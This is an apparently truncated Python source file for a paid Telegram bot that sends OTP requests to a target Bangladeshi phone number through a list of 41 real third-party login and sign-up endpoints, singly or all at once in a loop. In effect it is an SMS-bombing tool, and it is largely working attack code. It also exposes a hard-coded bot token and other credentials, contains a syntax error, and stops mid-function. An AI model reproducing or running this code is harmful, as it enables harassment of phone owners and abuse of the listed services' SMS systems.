import asyncio
import logging
import re
import os
import aiosqlite
import aiohttp
from datetime import datetime
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================== কনফিগারেশন (সব এনভায়রনমেন্ট থেকে) ==================
BOT_TOKEN = os.getenv("8826486988:AAFOOfdcrVCgvj532plzOQUXwx40yn3USl0")
ADMIN_ID = 1967494059
ADMIN_USERNAME = os.getenv("@RobiEntertainment", "@Admin")
DEV_USERNAME = RobiEntertainment", "Dev")
LOG_CHANNEL = 1967494059

# চেক: সব প্রয়োজনীয় ভেরিয়েবল সেট আছে কিনা
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN is not set in environment variables.")
if not ADMIN_ID:
    raise ValueError("ADMIN_ID is not set in environment variables.")
if not LOG_CHANNEL:
    raise ValueError("LOG_CHANNEL is not set in environment variables.")

try:
    ADMIN_ID = int(ADMIN_ID)
    LOG_CHANNEL = int(LOG_CHANNEL)
except ValueError:
    raise ValueError("ADMIN_ID and LOG_CHANNEL must be integers.")

# =================================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ---------- ডেটাবেস ----------
async def init_db():
    async with aiosqlite.connect("bot_database.db") as db:
        await db.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            login_username TEXT,
            balance INTEGER DEFAULT 0,
            join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active'
        )""")
        await db.execute("""CREATE TABLE IF NOT EXISTS accounts (
            username TEXT PRIMARY KEY,
            password TEXT,
            telegram_id INTEGER
        )""")
        await db.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY,
            amount INTEGER,
            usages INTEGER
        )""")
        await db.execute("""CREATE TABLE IF NOT EXISTS redeem_history (
            user_id INTEGER,
            code TEXT,
            PRIMARY KEY (user_id, code)
        )""")
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, login_username, balance, status) VALUES (?, 'Admin', 9999, 'active')",
            (ADMIN_ID,)
        )
        await db.commit()

# ---------- নম্বর ফরম্যাটিং ----------
def format_phone_number(raw: str) -> tuple:
    cleaned = re.sub(r'[\s\-+]', '', raw.strip())
    if cleaned.startswith('880'):
        cleaned = cleaned[3:]
    if cleaned.startswith('0') and len(cleaned) == 11 and cleaned.isdigit():
        return cleaned, True
    if cleaned.startswith('1') and len(cleaned) == 10 and cleaned.isdigit():
        return '0' + cleaned, True
    return cleaned, False

# ================== ৪৯টি OTP সাইটের তালিকা ==================
SITES = [
    {"id": 9, "name": "Deshal.net", "method": "POST", "url": "https://app.deshal.net/api/auth/login", "body_template": {"phone": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 10, "name": "Grameenphone Web", "method": "POST", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "body_template": {"msisdn": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 11, "name": "GP FWA / Bkash", "method": "POST", "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "body_template": {"phone": "{phone}", "email": "", "language": "en"}, "headers": {"Content-Type": "application/json"}},
    {"id": 12, "name": "BusBD.com.bd", "method": "POST", "url": "https://api.busbd.com.bd/api/auth", "body_template": {"phone": "+88{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 13, "name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body_template": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 14, "name": "OsudPotro.com", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body_template": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}, "headers": {"Content-Type": "application/json"}},
    {"id": 15, "name": "Apex4u.com", "method": "POST", "url": "https://api.apex4u.com/api/auth/login", "body_template": {"phoneNumber": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 16, "name": "Bohubrihi.com", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body_template": {"phone": "{phone}", "intent": "login"}, "headers": {"Content-Type": "application/json"}},
    {"id": 17, "name": "Fundesh.com.bd", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body_template": {"msisdn": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 18, "name": "Jatri / JSLGlobal", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body_template": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}, "headers": {"Content-Type": "application/json"}},
    {"id": 19, "name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body_template": {"mobile": "+88{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 20, "name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body_template": {"mobile": "+88{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 21, "name": "Qcoom.com", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body_template": {"mobileNumber": "+88{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 22, "name": "Garibookadmin.com", "method": "POST", "url": "https://api.garibookadmin.com/api/v4/user/login", "body_template": {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"}, "headers": {"Content-Type": "application/json"}},
    {"id": 23, "name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body_template": {"mobile": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 24, "name": "Shikho.com (Intent-1)", "method": "POST", "url": "https://api.shikho.com/public/activity/otp", "body_template": {"phone": "{phone}", "intent": "ap-discount-request"}, "headers": {"Content-Type": "application/json"}},
    {"id": 25, "name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body_template": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."}, "headers": {"Content-Type": "application/json"}},
    {"id": 26, "name": "Robi (DA API)", "method": "POST", "url": "https://da-api.robi.com.bd/da-nll/otp/send", "body_template": {"msisdn": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 27, "name": "Hoichoi (Viewlift)", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body_template": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}, "headers": {"Content-Type": "application/json"}},
    {"id": 28, "name": "Addatimes.com", "method": "POST", "url": "https://app.addatimes.com/api/login", "body_template": {"phone": "{phone}", "country_code": "BD"}, "headers": {"Content-Type": "application/json"}},
    {"id": 29, "name": "Regal Furniture", "method": "POST", "url": "https://regalfurniturebd.com/api/auth/otp-generate", "body_template": {"phone": "{phone}", "verification_code": ""}, "headers": {"Content-Type": "application/json"}},
    {"id": 30, "name": "DeeptoPlay.com", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body_template": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 31, "name": "TimezoneBD", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body_template": {"phone": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 32, "name": "UpaySystem", "method": "POST", "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", "body_template": {"device_uuid": "1234567890", "firebase_token": "dummy", "geo_location": "BD", "mno": "Grameenphone", "wallet_number": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 33, "name": "Chorki.com", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body_template": {"number": "+880{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 34, "name": "Arogga.com", "method": "POST", "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", "body_template": {"mobile": "{phone}", "fcmToken": "", "referral": ""}, "is_form": True, "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"id": 35, "name": "Pkluck2", "method": "POST", "url": "https://www.pkluck2.com/wps/verification/sms/noLogin", "body_template": {"mobileNum": "{phone}", "countryDialingCode": "880"}, "headers": {"Content-Type": "application/json"}},
    {"id": 36, "name": "AppLink", "method": "POST", "url": "https://applink.com.bd/appstore-v4-server/login/otp/request", "body_template": {"msisdn": "880{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 37, "name": "Care-Box", "method": "POST", "url": "https://newprod.api-care-box.click:444/api/user/register/?version=otp", "body_template": {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 38, "name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body_template": {"mobile_no": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 39, "name": "Jayabaji BD", "method": "POST", "url": "https://www.jayabajibd.life/api/register/confirm", "body_template": {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"}, "headers": {"Content-Type": "application/json"}},
    {"id": 40, "name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body_template": {"phone": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 41, "name": "BdTickets.com", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body_template": {"phone": "+880{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 42, "name": "Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "body_template": {"mobile": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 43, "name": "SendMySMS", "method": "POST", "url": "https://sendmysms.net/send-otp.php", "body_template": {"phonenumber": "{phone}"}, "is_form": True, "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
    {"id": 44, "name": "Shikho.com (Intent-2)", "method": "POST", "url": "https://api.shikho.com/auth/v2/send/sms", "body_template": {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"}, "headers": {"Content-Type": "application/json"}},
    {"id": 45, "name": "Eonbazar", "method": "POST", "url": "https://app.eonbazar.com/api/auth/login", "body_template": {"method": "otp", "mobile": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 46, "name": "NESCO SSL Wireless", "method": "POST", "url": "http://nesco.sslwireless.com/api/v1/login", "body_template": {"phone_number": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 47, "name": "Quizgiri", "method": "POST", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "body_template": {"country_code": "+880", "phone": "{phone}"}, "headers": {"Content-Type": "application/json"}},
    {"id": 48, "name": "Bazar365", "method": "POST", "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", "body_template": {"phone": "{phone}", "applicationChannel": "WEB_APP"}, "headers": {"Content-Type": "application/json"}},
    {"id": 49, "name": "Bioscopelive", "method": "POST", "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", "body_template": {"phone": "{phone}", "applicationChannel": "WEB_APP"}, "headers": {"Content-Type": "application/json"}}
]

TOTAL_SITES = len(SITES)
PER_PAGE = 6

# ---------- কিবোর্ড ----------
user_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🚀 Send SMS"), KeyboardButton(text="👤 My Profile")],
        [KeyboardButton(text="👥 Referral"), KeyboardButton(text="🎁 Redeem Code")],
        [KeyboardButton(text="☎️ Support")]
    ],
    resize_keyboard=True,
    persistent=True
)

admin_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="➕ Add Credit"), KeyboardButton(text="➖ Remove Credit")],
        [KeyboardButton(text="🚫 User Ban"), KeyboardButton(text="✅ User Unban")],
        [KeyboardButton(text="📣 Broadcast"), KeyboardButton(text="🎟 Create Redeem Code")],
        [KeyboardButton(text="👥 Total User"), KeyboardButton(text="🔐 Create Account")],
        [KeyboardButton(text="⬅️ Back")]
    ],
    resize_keyboard=True,
    persistent=True
)

# ---------- FSM ----------
class AuthState(StatesGroup):
    wait_username = State()
    wait_password = State()

class SMSState(StatesGroup):
    waiting_for_number = State()

class UserState(StatesGroup):
    waiting_for_code = State()

class AdminState(StatesGroup):
    add_id = State()
    add_amount = State()
    rem_id = State()
    rem_amount = State()
    ban_id = State()
    unban_id = State()
    broadcast_msg = State()
    code_name = State()
    code_amount = State()
    code_usages = State()
    acc_user = State()
    acc_pass = State()

# ---------- চেক ফাংশন ----------
async def is_logged_in_and_active(user_id):
    if user_id == ADMIN_ID:
        return True
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT status FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            if row and row[0] == 'active':
                return True
    return False

async def proceed_to_login(chat_id, user_first_name, state):
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT status FROM users WHERE user_id = ?", (chat_id,)) as cursor:
            row = await cursor.fetchone()
            if row:
                if row[0] == 'banned':
                    await bot.send_message(chat_id, f"⛔ You are banned. Contact Admin: {ADMIN_USERNAME}", reply_markup=ReplyKeyboardRemove())
                    return
                await bot.send_message(chat_id, f"👋 Welcome back {user_first_name}!", reply_markup=user_kb)
                return
    await bot.send_message(chat_id, "🔒 **Login Required**\n\nPlease enter your **Username**:", reply_markup=ReplyKeyboardRemove())
    await state.set_state(AuthState.wait_username)

# ---------- সাইট সিলেকশন ইনলাইন কীবোর্ড ----------
def get_site_keyboard(page=0):
    start = page * PER_PAGE
    end = min(start + PER_PAGE, TOTAL_SITES)
    keyboard = []
    for i in range(start, end):
        site = SITES[i]
        btn_text = f"{site['id']}. {site['name']}"
        keyboard.append([InlineKeyboardButton(text=btn_text, callback_data=f"site_{site['id']}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="◀️ Prev", callback_data=f"page_{page-1}"))
    if end < TOTAL_SITES:
        nav_buttons.append(InlineKeyboardButton(text="Next ▶️", callback_data=f"page_{page+1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([
        InlineKeyboardButton(text="📤 All Sites", callback_data="send_all"),
        InlineKeyboardButton(text="❌ Cancel", callback_data="cancel_sms")
    ])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# ---------- API কল ফাংশন ----------
async def call_site_api(site: dict, phone: str) -> dict:
    url = site["url"]
    method = site.get("method", "POST")
    body_template = site["body_template"]
    headers = site.get("headers", {"Content-Type": "application/json"})
    is_form = site.get("is_form", False)

    body = {}
    for k, v in body_template.items():
        if isinstance(v, str):
            body[k] = v.replace("{phone}", phone)
        else:
            body[k] = v

    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            if method.upper() == "POST":
                if is_form:
                    async with session.post(url, data=body, headers=headers) as resp:
                        raw_text = await resp.text()
                else:
                    async with session.post(url, json=body, headers=headers) as resp:
                        raw_text = await resp.text()
            else:
                async with session.get(url, params=body, headers=headers) as resp:
                    raw_text = await resp.text()

            if resp.status == 200:
                lower = raw_text.lower()
                if "error" in lower or "failed" in lower or "invalid" in lower:
                    return {"success": False, "message": raw_text[:200]}
                else:
                    return {"success": True, "message": raw_text[:200]}
            else:
                return {"success": False, "message": f"HTTP {resp.status}: {raw_text[:200]}"}
    except asyncio.TimeoutError:
        return {"success": False, "message": "Timeout"}
    except Exception as e:
        return {"success": False, "message": str(e)[:200]}

# ---------- /start ----------
@dp.message(Command("start"))
async def start_command(message: types.Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        await message.answer("👑 **Admin Panel**\nWelcome back, Admin!", reply_markup=admin_kb)
        return
    await proceed_to_login(user_id, message.from_user.first_name, state)

@dp.message(Command("admin"))
async def admin_cmd(message: types.Message, state: FSMContext):
    await state.clear()
    if message.from_user.id == ADMIN_ID:
        await message.answer("👑 **Admin Panel**", reply_markup=admin_kb)

@dp.message(F.text == "⬅️ Back")
async def back_u(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("Switched to User Mode.", reply_markup=user_kb)

@dp.message(F.text == "👤 My Profile")
async def my_profile(message: types.Message, state: FSMContext):
    await state.clear()
    if not await is_logged_in_and_active(message.from_user.id):
        return
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT balance, login_username, status FROM users WHERE user_id = ?", (message.from_user.id,)) as cursor:
            row = await cursor.fetchone()
            if row:
                await message.answer(
                    f"👤 **MY PROFILE**\n\n"
                    f"🆔 **TG ID:** `{message.from_user.id}`\n"
                    f"👤 **Username:** {row[1]}\n"
                    f"💰 **Credits:** {row[0]}\n"
                    f"🚦 **Status:** {row[2].capitalize()}\n\n"
                    f"👨‍💻 **Dev:** {DEV_USERNAME}",
                    parse_mode="Markdown"
                )

# ---------- 📱 OTP পাঠানো ----------
@dp.message(F.text == "🚀 Send SMS")
async def start_sms_flow(message: types.Message, state: FSMContext):
    await state.clear()
    if not await is_logged_in_and_active(message.from_user.id):
        return

    user_id = message.from_user.id
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            if not row or row[0] < 1:
                await message.answer(f"❌ You don't have enough credits. Please use a Redeem Code or contact Admin {ADMIN_USERNAME}.")
                return

    await message.answer("📱 Please enter the **Phone Number** (e.g. 018XXXXXXXX, 017XXXXXXXX):")
    await state.set_state(SMSState.waiting_for_number)

@dp.message(SMSState.waiting_for_number)
async def process_number(message: types.Message, state: FSMContext):
    raw = message.text.strip()
    formatted, valid = format_phone_number(raw)
    if not valid:
        await message.answer(
            f"❌ Invalid number format!\n\n"
            f"Please enter a valid 11-digit Bangladeshi number starting with **0** (e.g. 01827572551).\n"
            f"Your input: `{raw}`"
        )
        return

    await state.update_data(number=formatted)
    await state.update_data(page=0)
    await message.answer(
        f"✅ Number set to: `{formatted}`\n\n"
        f"Select a site to send OTP (1 credit per site) or choose 'All Sites' (total {TOTAL_SITES} credits):",
        parse_mode="Markdown",
        reply_markup=get_site_keyboard(0)
    )

# ---------- সাইট সিলেকশন কলব্যাক ----------
@dp.callback_query(F.data.startswith("site_"))
async def process_site_selection(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    site_id = int(callback.data.split("_")[1])
    site = next((s for s in SITES if s["id"] == site_id), None)
    if not site:
        await callback.message.edit_text("❌ Site not found.")
        return

    data = await state.get_data()
    phone = data.get("number")
    if not phone:
        await callback.message.edit_text("❌ Phone number missing. Please start over.")
        return

    user_id = callback.from_user.id
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < 1:
                await callback.message.edit_text(f"❌ Insufficient credits. You need at least 1 credit.")
                return
            await db.execute("UPDATE users SET balance = balance - 1 WHERE user_id = ?", (user_id,))
            await db.commit()

    result = await call_site_api(site, phone)
    if result["success"]:
        await callback.message.edit_text(
            f"✅ **OTP sent via {site['name']}**\n"
            f"📱 Number: `{phone}`\n"
            f"📡 Response: `{result['message']}`\n"
            f"💰 1 Credit deducted.",
            parse_mode="Markdown"
        )
    else:
        await callback.message.edit_text(
            f"❌ **Failed to send OTP via {site['name']}**\n"
            f"📱 Number: `{phone}`\n"
            f"⚠️ Error: `{result['message']}`\n"
            f"💰 Credit not deducted (refunded).",
            parse_mode="Markdown"
        )
        async with aiosqlite.connect("bot_database.db") as db:
            await db.execute("UPDATE users SET balance = balance + 1 WHERE user_id = ?", (user_id,))
            await db.commit()

    log_text = (
        f"📝 **OTP LOG**\n\n"
        f"👤 **User ID:** `{user_id}`\n"
        f"📱 **Number:** `{phone}`\n"
        f"🌐 **Site:** {site['name']} (ID {site['id']})\n"
        f"🚦 **Status:** {'✅ Success' if result['success'] else '❌ Failed'}\n"
        f"📡 **Response:** `{result['message']}`"
    )
    try:
        await bot.send_message(chat_id=LOG_CHANNEL, text=log_text, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Log channel error: {e}")

    current_page = data.get("page", 0)
    await callback.message.answer(
        f"✅ Number: `{phone}`\n\nSelect another site or choose 'All Sites':",
        parse_mode="Markdown",
        reply_markup=get_site_keyboard(current_page)
    )

@dp.callback_query(F.data == "send_all")
async def process_send_all(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    data = await state.get_data()
    phone = data.get("number")
    if not phone:
        await callback.message.edit_text("❌ Phone number missing. Please start over.")
        return

    user_id = callback.from_user.id
    required_credits = TOTAL_SITES
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < required_credits:
                await callback.message.edit_text(
                    f"❌ Insufficient credits. You need {required_credits} credits for all sites, but you have {row[0] if row else 0}."
                )
                return
            await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (required_credits, user_id))
            await db.commit()

    await callback.message.edit_text(f"⏳ Sending OTP to all {TOTAL_SITES} sites... Please wait.")
    results = []
    for site in SITES:
        result = await call_site_api(site, phone)
        results.append((site["name"], result))
        await asyncio.sleep(0.3)

    success_count = sum(1 for _, r in results if r["success"])
    fail_count = TOTAL_SITES - success_count
    summary = f"✅ **All Sites OTP Summary**\n📱 Number: `{phone}`\n✅ Success: {success_count}\n❌ Failed: {fail_count}\n\n"
    detail_lines = []
    for name, r in results[:10]:
        status = "✅" if r["success"] else "❌"
        detail_lines.append(f"{status} {name}: {r['message'][:30]}")
    if len(results) > 10:
        detail_lines.append(f"... and {len(results)-10} more.")
    summary += "\n".join(detail_lines)
    await callback.message.edit_text(summary, parse_mode="Markdown")

    log_text = f"📝 **BULK OTP LOG**\n👤 User: `{user_id}`\n📱 Number: `{phone}`\n"
    for name, r in results:
        log_text += f"\n{name}: {'✅' if r['success'] else '❌'} - {r['message'][:50]}"
    try:
        await bot.send_message(chat_id=LOG_CHANNEL, text=log_text[:4000], parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Log channel error: {e}")

    current_page = data.get("page", 0)
    await callback.message.answer(
        f"✅ Number: `{phone}`\n\nSelect another site or choose 'All Sites':",
        parse_mode="Markdown",
        reply_markup=get_site_keyboard(current_page)
    )

@dp.callback_query(F.data == "cancel_sms")
async def cancel_sms(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.clear()
    await callback.message.edit_text("❌ SMS sending cancelled.")
    await callback.message.answer("You can start again with /start or 'Send SMS'.", reply_markup=user_kb)

@dp.callback_query(F.data.startswith("page_"))
async def change_page(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    page = int(callback.data.split("_")[1])
    data = await state.get_data()
    phone = data.get("number")
    if not phone:
        await callback.message.edit_text("❌ Session expired. Start again.")
        return
    await state.update_data(page=page)
    await callback.message.edit_reply_markup(reply_markup=get_site_keyboard(page))

# ---------- রিডিম ----------
@dp.message(F.text == "🎁 Redeem Code")
async def ask_redeem(message: types.Message, state: FSMContext):
    await state.clear()
    if not await is_logged_in_and_active(message.from_user.id):
        return
    await message.answer("🎟 **Enter your Promo/Redeem Code:**")
    await state.set_state(UserState.waiting_for_code)

@dp.message(UserState.waiting_for_code)
async def process_redeem(message: types.Message, state: FSMContext):
    code = message.text.strip()
    user_id = message.from_user.id

    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT 1 FROM redeem_history WHERE user_id = ? AND code = ?", (user_id, code)) as cur:
            if await cur.fetchone():
                await message.answer("❌ You have already used this code.")
                await state.clear()
                return

        async with db.execute("SELECT amount, usages FROM redeem_codes WHERE code = ?", (code,)) as cur:
            row = await cur.fetchone()
            if not row or row[1] <= 0:
                await message.answer("❌ Invalid or Expired Code.")
                await state.clear()
                return

            amount = row[0]
            await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
            await db.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code = ?", (code,))
            await db.execute("INSERT INTO redeem_history (user_id, code) VALUES (?, ?)", (user_id, code))
            await db.commit()

    await message.answer(f"🎉 **Code Redeemed!**\n✅ You got +{amount} Credits.")
    await state.clear()

@dp.message(F.text == "👥 Referral")
async def referral_info(message: types.Message, state: FSMContext):
    await state.clear()
    if not await is_logged_in_and_active(message.from_user.id):
        return
    await message.answer(f"👥 **Referral System**\n\nCurrently disabled. Ask friends to contact Admin ({ADMIN_USERNAME}).")

@dp.message(F.text == "☎️ Support")
async def support(message: types.Message, state: FSMContext):
    await state.clear()
    if not await is_logged_in_and_active(message.from_user.id):
        return
    await message.answer(f"☎️ **Support**\n\nFor issues or buying credits, contact Admin:\n👨‍💻 **{ADMIN_USERNAME}**")

# ---------- লগইন ----------
@dp.message(AuthState.wait_username)
async def process_username(message: types.Message, state: FSMContext):
    await state.update_data(username=message.text.strip())
    await message.answer("🔑 Enter **Password**:")
    await state.set_state(AuthState.wait_password)

@dp.message(AuthState.wait_password)
async def process_password(message: types.Message, state: FSMContext):
    data = await state.get_data()
    username = data.get('username')
    password = message.text.strip()
    user_id = message.from_user.id

    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT password, telegram_id FROM accounts WHERE username = ?", (username,)) as cursor:
            row = await cursor.fetchone()
            if row and row[0] == password:
                if row[1] is not None and row[1] != user_id:
                    await message.answer(f"❌ Account linked to another device.\nContact Admin: {ADMIN_USERNAME}")
                    await state.clear()
                    return
                await db.execute("UPDATE accounts SET telegram_id = ? WHERE username = ?", (user_id, username))
                await db.execute(
                    "INSERT OR IGNORE INTO users (user_id, login_username, balance) VALUES (?, ?, 0)",
                    (user_id, username)
                )
                await db.commit()
                await message.answer("✅ **Login Successful!**", reply_markup=user_kb)
            else:
                await message.answer(
                    f"❌ **Wrong Username or Password!**\n\nIf you need an account, please contact Admin:\n👨‍💻 **{ADMIN_USERNAME}**"
                )
    await state.clear()

# ---------- অ্যাডমিন ----------
@dp.message(F.text == "🔐 Create Account", F.from_user.id == ADMIN_ID)
async def create_acc(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("👤 Enter a new **Username**:")
    await state.set_state(AdminState.acc_user)

@dp.message(F.text == "➕ Add Credit", F.from_user.id == ADMIN_ID)
async def add_cr(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("👤 Enter **Telegram ID** to add credits:")
    await state.set_state(AdminState.add_id)

@dp.message(F.text == "➖ Remove Credit", F.from_user.id == ADMIN_ID)
async def rem_cr(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("👤 Enter **Telegram ID** to remove credits:")
    await state.set_state(AdminState.rem_id)

@dp.message(F.text == "🚫 User Ban", F.from_user.id == ADMIN_ID)
async def ban_u(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("👤 Enter **Telegram ID** to BAN:")
    await state.set_state(AdminState.ban_id)

@dp.message(F.text == "✅ User Unban", F.from_user.id == ADMIN_ID)
async def unban_u(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("👤 Enter **Telegram ID** to UNBAN:")
    await state.set_state(AdminState.unban_id)

@dp.message(F.text == "📣 Broadcast", F.from_user.id == ADMIN_ID)
async def ask_broadcast(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("📢 Send the message you want to broadcast:")
    await state.set_state(AdminState.broadcast_msg)

@dp.message(F.text == "🎟 Create Redeem Code", F.from_user.id == ADMIN_ID)
async def cr_code(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("🎟 Enter **Code Name** (e.g. FREE50):")
    await state.set_state(AdminState.code_name)

@dp.message(F.text == "👥 Total User", F.from_user.id == ADMIN_ID)
async def stats_cmd(message: types.Message, state: FSMContext):
    await state.clear()
    async with aiosqlite.connect("bot_database.db") as db:
        async with db.execute("SELECT COUNT(*) FROM users") as cur:
            total_users = await cur.fetchone()
        async with db.execute("SELECT COUNT(*) FROM accounts") as cur:
            total_accounts = await cur.fetchone()
    await message.answer(
        f"📊 **SYSTEM STATS**\n\n"
        f"👥 Logged-in Users: {total_users[0]}\n"
        f"🔐 Created Accounts: {total_accounts[0]}"
    )

@dp.message(AdminState.acc_user)
async def acc_u(message: types.Message, state: FSMContext):
    await state.update_data(u=message.text.strip())
    await message.answer("🔑 Enter **Password**:")
    await state.set_state(AdminState.acc_pass)

@dp.message(AdminState.acc_pass)
async def acc_p(message: types.Message, state: FSMContext):
    data = await state.get_data()
    username = data['u']
    password = message.text.strip()
    async with aiosqlite.connect("bot_database.db") as db:
        try:
            await db.execute("INSERT INTO accounts (username, password) VALUES (?, ?)", (username, password))
            await db.commit()
            await message.answer(f"✅ **Account Created!**\n👤 Username: `{username}`\n🔑 Password: `{password}`", parse_mode="Markdown")
        except aiosqlite.IntegrityError:
            await message.answer("❌ Username already exists!")
    await state.clear()

@dp.message(AdminState.add_id)
async def add_i(message: types.Message, state: FSMContext):
    try:
